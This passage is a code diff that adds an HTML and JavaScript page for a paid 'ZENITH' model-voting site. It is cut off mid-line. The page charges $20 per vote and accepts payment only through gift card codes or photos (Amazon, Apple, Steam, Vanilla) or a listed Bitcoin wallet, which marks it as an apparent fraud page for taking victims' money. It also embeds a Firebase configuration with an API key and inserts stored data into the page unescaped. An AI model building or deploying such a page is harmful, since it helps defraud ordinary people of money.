@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ZENITH MODEL - VOTE</title>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
+body{background:#000;color:#fff;text-align:center}
+h1{font-family:Georgia,serif;letter-spacing:4px;margin:18px 0 6px;font-size:26px}
+.sub{font-size:10px;letter-spacing:3px;color:#888;margin-bottom:12px}
+.search{display:flex;justify-content:center;gap:6px;margin:12px auto;max-width:400px;padding:0 12px}
+.search input{flex:1;padding:12px;background:#111;border:1px solid #333;color:#fff}
+.btn-gold{background:#c9a86a;color:#000;border:none;padding:12px 18px;font-weight:700;cursor:pointer;letter-spacing:1px}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:12px;max-width:1100px;margin:14px auto;padding:0 12px}
+.card{background:#111;border:1px solid #222;padding-bottom:10px}
+.card img{width:100%;height:200px;object-fit:cover;background:#222}
+.modal{position:fixed;inset:0;background:rgba(0,0,0,.85);display:none;align-items:center;justify-content:center;z-index:99;padding:12px}
+.modalBox{background:#111;border:1px solid #333;padding:16px;max-width:420px;width:100%;text-align:left}
+.modalBox input,.modalBox select{width:100%;padding:11px;background:#000;border:1px solid #333;color:#fff;margin:6px 0;font-size:13px}
+.tabs{display:flex;gap:6px;margin:8px 0}
+.tabs button{flex:1;padding:10px;background:#222;color:#fff;border:1px solid #333;cursor:pointer;font-size:11px}
+.tabs button.active{background:#c9a86a;color:#000}
+.wallet{font-size:11px;word-break:break-all;background:#000;border:1px dashed #c9a86a;padding:8px;margin:6px 0;text-align:center}
+</style>
+</head>
+<body>
+<h1>ZENITH</h1>
+<div class="sub">MODEL MANAGEMENT 2026/2027</div>
+
+<div class="search">
+<input id="codeInput" placeholder="" value="">
+<button class="btn-gold" onclick="searchCode()">SEARCH</button>
+</div>
+
+<div class="grid" id="grid"></div>
+
+<div class="modal" id="voteModal">
+<div class="modalBox">
+<h3 id="mName" style="text-align:center;margin-bottom:8px"></h3>
+<p style="font-size:10px;color:#888;text-align:center;letter-spacing:1px">Code: <span id="mCode"></span> | <span id="mVotes"></span> votes</p>
+<label style="font-size:10px;color:#888;margin-top:10px;display:block">Your Email</label>
+<input id="vEmail" placeholder="your@email.com">
+<label style="font-size:10px;color:#888;display:block">Quantity - $20 per vote</label>
+<input id="vQty" type="number" value="1" min="1" oninput="calcTotal()">
+<div style="font-size:13px;margin:6px 0">Total: $<span id="vTotal">20</span></div>
+
+<div class="tabs">
+<button id="tabGift" class="active" onclick="switchTab('gift')">Gift Card</button>
+<button id="tabBtc" onclick="switchTab('btc')">BTC</button>
+</div>
+
+<div id="giftBox">
+<select id="giftType"><option>Amazon</option><option>Apple</option><option>Steam</option><option>eBay</option><option>Vanilla</option><option>Other</option></select>
+<input id="giftCode" placeholder="Gift Card Code">
+<input id="giftFile" type="file" accept="image/*">
+</div>
+
+<div id="btcBox" style="display:none">
+<div class="wallet">BTC ONLY: bc1q4h7gjy978am0ntv9u7wj2erhw4vv0khsmsfun4</div>
+<input id="btcTxn" placeholder="BTC Transaction ID / Hash">
+</div>
+
+<button class="btn-gold" style="width:100%;margin-top:10px" onclick="payNow()">PAY VIA EMAIL @ Zenithmodeling1@outlook.com</button>
+<button style="width:100%;margin-top:8px;background:#222;color:#fff;border:1px solid #333;padding:10px;cursor:pointer" onclick="closeModal()">CLOSE</button>
+<p id="payStatus" style="font-size:11px;color:#c9a86a;text-align:center;margin-top:8px"></p>
+</div>
+</div>
+
+<script>
+var firebaseConfig={apiKey:"AIzaSyCah_ucdI55pyBR_RJ_ILu26aSALI1rVbA",authDomain:"zenith-2026-vote.firebaseapp.com",databaseURL:"https://zenith-2026-vote-default-rtdb.firebaseio.com",projectId:"zenith-2026-vote",storageBucket:"zenith-2026-vote.firebasestorage.app",messagingSenderId:"534661022606",appId:"1:534661022606:web:31af138277cf4e88ce9adf"};
+firebase.initializeApp(firebaseConfig);
+var db=firebase.database();
+var models=[]; var selected=null; var payMode='gift';
+
+function calcTotal(){ var q=parseInt(document.getElementById('vQty').value)||1; document.getElementById('vTotal').textContent=q*20; }
+
+window.switchTab=function(t){ payMode=t; document.getElementById('giftBox').style.display=t==='gift'?'block':'none'; document.getElementById('btcBox').style.display=t==='btc'?'block':'none'; document.getElementById('tabGift').className=t==='gift'?'active':''; document.getElementById('tabBtc').className=t==='btc'?'active':''; };
+
+db.ref('models').on('value', function(snap){
+ var data=snap.val();
+ models=data?Object.keys(data).map(function(k){ var v=data[k]; v.id=k; return v;}):[];
+ render(models);
+});
+
+function render(list){
+ var grid=document.getElementById('grid'); grid.innerHTML='';
+ list.forEach(function(m){
+  var d=document.createElement('div'); d.className='card';
+  d.innerHTML='<img src="'+(m.mainImage||m.image)+'"><div style="padding:8px"><b style="font-size:12px">'+m.name+'</b><br><small style="color:#c9a86a;font-size:10px">'+m.code+'</small><br><small style="color:#888">☆ '+(m.votes||0)+' VOTES</small><br><button class="btn-gold" style="margin-top:6px;padding:8px 14px;font-size:10px" onclick="openVote(\''+m.id+'\')">VOTE</button></div>';
+  grid.appendChild(d);
+ });
+}
+
+window.searchCode=function(){
+ var q=document.getElementById('codeInput').value.trim().toLowerCase();
+ if(!q){ render(models); return; }
+ var f=models.filter(function(m){ return m.code.toLowerCase().includes(q) || m.name.toLowerCase().includes(q); });
+ render(f);
+};
+
+window.openVote=function(id){
+ selected=models.find(function(m){return m.id===id});
+ if(!selected) return;
+ document.getElementById('mName').textContent=selected.name;
+ document.getElementById('mCode').
